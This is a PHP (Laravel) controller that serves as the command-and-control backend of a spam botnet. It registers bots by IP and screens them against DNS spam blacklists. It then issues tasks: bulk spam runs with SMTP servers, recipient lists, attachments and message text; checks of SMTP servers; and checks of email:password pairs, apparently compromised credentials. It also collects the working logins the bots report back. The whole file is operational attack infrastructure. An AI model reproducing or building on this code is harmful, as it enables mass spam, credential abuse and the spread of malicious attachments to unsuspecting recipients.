<?php

namespace App\Http\Controllers;

use App\Bots;
use App\ControlMailList;
use App\MailSettings;
use App\PannelSettings;
use App\SettingsForCheckSMTP;
use App\SMTP;
use App\smtpfindpiece;
use App\smtplistpiece;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;

class CommandController extends Controller
{
    public function index(Request $request)
    {
        $ip          = $this->getRealIP();
        $bot         = Bots::where(['ip' => $ip])->first();
        $statusAdmin = PannelSettings::whereId(1)->first();

        if (isset($bot)) {
            if ($bot->ban == 1) {
                echo 'Your IP adress (' . $ip . ') was blocked!';
                exit;
            }
        } else {
            abort(404);
        }

        if ($statusAdmin->checkBlackList != 'noNeedCheckBlack') {
            if ( ! isset($bot->blacklistdate)) {
                if ($this->IpBlackListTest($ip) > 0) {
                    $bot->black         = 1;
                    $bot->blacklistdate = Carbon::now('Europe/Kiev');
                    $bot->save();
                    echo '0';
                    exit();
                } else {
                    $bot->black         = 0;
                    $bot->blacklistdate = Carbon::now('Europe/Kiev');
                    $bot->save();
                }
            } else {
                if (Carbon::parse($bot->blacklistdate, 'Europe/Kiev')->diffInHours(Carbon::now('Europe/Kiev')) > 0) {
                    if ($this->IpBlackListTest($ip) > 0) {
                        $bot->black         = 1;
                        $bot->blacklistdate = Carbon::now('Europe/Kiev');
                        $bot->save();
                        echo '0';
                        exit();
                    } else {
                        $bot->black         = 0;
                        $bot->blacklistdate = Carbon::now('Europe/Kiev');
                        $bot->save();
                    }
                } else {
                    if (isset($bot->ban) && $bot->ban) {
                        echo '0';
                        exit();
                    }
                }
            }
        }

        if ($statusAdmin->status == 'SPAM') {

            $settings = MailSettings::find(1);

            echo "3\n";

            echo $settings->thread_count . "\n";

            $smtp = SMTP::orderByRaw("RAND()")->take($settings->smtp_count)->get();
            foreach ($smtp as $item) {
                echo $item->domen . "\t";
            }
            echo "\n";

            $files = Storage::allFiles(config('config.emails.mails'));
            if (count($files) > 0) {
                $filename = "botid-" . $bot->id . "-file" . time('U') . '.txt';
                Storage::move($files[0], config('config.emails.go_mails') . "/" . $filename);
                echo url('download/go-mails/' . $filename);
                echo "\n";
            } else {
                echo "\n";
            }

            $files = Storage::allFiles(config('config.fromname'));
            if (count($files) > 0) {
                echo url('download/' . $files[rand(0, count($files) - 1)]);
                echo "\n";
            } else {
                echo "\n";
            }

            if ($settings->send_attach != 0) {
                $files = Storage::allFiles(config('config.attach'));
                if (count($files) > 0) {
                    echo url('download/' . $files[rand(0, count($files) - 1)]);
                    echo "\n";
                } else {
                    echo "\n";
                }
            }

            echo $settings->attach_name_macros . "\n";

            echo $settings->x_mailer . "\n";

            echo "macro1=" . $settings->macros1 . "\t" . "macro2=" . $settings->macros2 . "\t" . "macro3=" . $settings->macros3 . "\n";

            echo $settings->emails_from_server . "\n";

            echo $settings->message_theme . "\n";

            echo $settings->message_text . "\n";

            $bot->bot_status = 1;
            $bot->otk        = 0;
            $bot->life       = 1;
            $bot->time       = Carbon::now('Europe/Kiev');
            $bot->save();
        }

        if ($statusAdmin->status == 'SMTPCHECK') {

            $settingsSMTP = SettingsForCheckSMTP::find(1);

            $smtpListBotCount = smtplistpiece::where('botid', '<>', 'NULL')->select('bot_id')->distinct()->count();

            $settings = MailSettings::find(1);

            if (\intval($smtpListBotCount) < \intval($settingsSMTP->countbots)) {

                if (smtplistpiece::where(['botid' => $bot->id])->first() == null) {

                    echo "8\n";

                    echo $settingsSMTP->threads . "\n";

                    $smtp = smtplistpiece::where(['isget' => 0])->orderByRaw('RAND()')->take($settingsSMTP->countsmtp)->get();

                    foreach ($smtp as $item) {
                        echo $item->smtp . "\t";
                        $item->isget = 1;
                        $item->time  = Carbon::now('Europe/Kiev');
                        $item->botid = $bot->id;
                        $item->save();
                    }
                    echo "\n";

                    $controlMail = ControlMailList::orderByRaw('RAND()')->first();
                    echo $controlMail->mail . "\n";

                    echo $settingsSMTP->mark . "\n";

                    if ($settingsSMTP->includefile == 1) {
                        $files = Storage::allFiles(config('config.smtp_check_attach'));
                        echo url('download/' . $files[rand(0, count($files) - 1)]);
                        echo "\n";
                    } else {
                        echo "\n";
                    }

                    if ($settingsSMTP->mailText == 1) {
                        $files = Storage::allFiles(config('config.mailTextFile'));
                        echo url('download/' . $files[0]);
                        echo "\n";
                    } else {
                        echo "\n";
                    }

                    $files = Storage::allFiles(config('config.fromname'));
                    if (count($files) > 0) {
                        echo url('download/' . $files[rand(0, count($files) - 1)]);
                        echo "\n";
                    } else {
                        echo "\n";
                    }

                    echo $settings->x_mailer . "\n";
                } else {
                    echo 0;
                    exit();
                }
            } else { //count bots
                echo 0;
                exit();
            }
        }

        if ($statusAdmin->status == 'SMTPFIND') {

            $settingsSMTP = SettingsForCheckSMTP::find(1);
            $list         = smtpfindpiece::where(['isget' => 0])->orderByRaw('RAND()')->take($settingsSMTP->countsmtp)->get();
            if (count($list) > 0) {

                echo "2\n";
                echo $settingsSMTP->threads . "\n";

                foreach ($list as $item) {
                    $item->isget = 1;
                    echo $item->emailpas . "\t";
                    $item->time  = Carbon::now('Europe/Kiev');
                    $item->botid = $bot->id;
                    $item->save();
                }
            } else {
                echo 0;
                exit();
            }
        }
    }

    function getRealIP()
    {
        if ( ! empty($_SERVER['HTTP_X_REAL_IP'])) {
            $ip = $_SERVER['HTTP_X_REAL_IP'];
        } elseif ( ! empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif ( ! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }

        return $ip;
    }

    function IpBlackListTest($ip)
    {
        $countBans = 0;
        $baracuda  = "b.barracudacentral.org";
        $spamHaus  = "zen.spamhaus.org";
        $abuseAt   = "cbl.abuseat.org";
        $spamHaus2 = "xbl.spamhaus.org";

        $urlb  = implode(".", array_reverse(explode(".", $ip))) . "." . $baracuda;
        $urls  = implode(".", array_reverse(explode(".", $ip))) . "." . $spamHaus;
        $urla  = implode(".", array_reverse(explode(".", $ip))) . "." . $abuseAt;
        $urls2 = implode(".", array_reverse(explode(".", $ip))) . "." . $spamHaus2;

        $record = dns_get_record($urlb);
        $countBans += count($record);
        $record = dns_get_record($urls);
        $countBans += count($record);
        $record = dns_get_record($urls2);
        $countBans += count($record);
        $record = dns_get_record($urla);
        $countBans += count($record);

        return $countBans;
    }

    public function sendcheckers(Request $request)
    {
        $set    = SettingsForCheckSMTP::find(1);
        $result = trim($request->get('result'));

        if (isset($result) && strlen($result) > 3) {

            $resultArray = explode("\n", $result);

            foreach ($resultArray as $value) {

                $value = trim($value);
                if (empty($value)) {
                    continue;
                }
                $smtp   = explode("!-!", $value)[0];
                $status = trim(explode("!-!", $value)[1]);

                $logFile    = "";
                $status_err = "";

                if (strtoupper($status) == 'SENT') {
                    $logFile = "smtp_check_logs/" . $set['mark'] . "_good.txt";
                } else {
                    $logFile    = "smtp_check_logs/" . $set['mark'] . "_bad.txt";
                    $status_err = trim(explode(':', $status, 2)[1]);
                    $status     = trim(explode(':', $status, 2)[0]);
                }
                Storage::append($logFile, $value . "\r\n");

                $smtp         = smtplistpiece::where(['smtp' => trim($smtp)])->first();
                $smtp->botid  = 0;
                $smtp->isget  = 1;
                $smtp->time   = '';
                $smtp->status = strtoupper($status);
                $smtp->errmsg = $status_err;
                $smtp->save();
            }
        }
    }

    public function smtpcheckres(Request $request)
    {
        $result = $request->get('result');

        $res = explode("\r\n", urldecode($result));

        foreach ($res as $item) {
            $r = explode('|', $item);
            if (count($r) > 3) {
                $mailpass = $r[2] . ":" . $r[3];
            } else {
                $t = explode("://", $item);
                if (count($t) < 2) {
                    continue;
                }
                $mailpass = $t[1];
            }

            $e = smtpfindpiece::where(['emailpas' => $mailpass])->first();
            if ($e != null) {
                $e->status = urldecode($item);
                $e->isget  = 1;
                $e->time   = '';
                $e->save();
            }
        }
    }

    public function postIndex(Request $request)
    {
        $ip     = $this->getRealIP();
        $bot    = Bots::where(['ip' => $ip])->first();
        $status = $request->get('status');
        if (isset($bot)) {
            if ($bot->ban == 1) {
                echo 'Your IP adress (' . $ip . ') was blocked!';
                exit;
            }
            $bot->bot_status = $status;
            $bot->life       = 1;
            $bot->otk        = 0;
            $bot->save();
        } else {
            Bots::create([
                'ip' => $ip,
            ]);
        }
    }

}
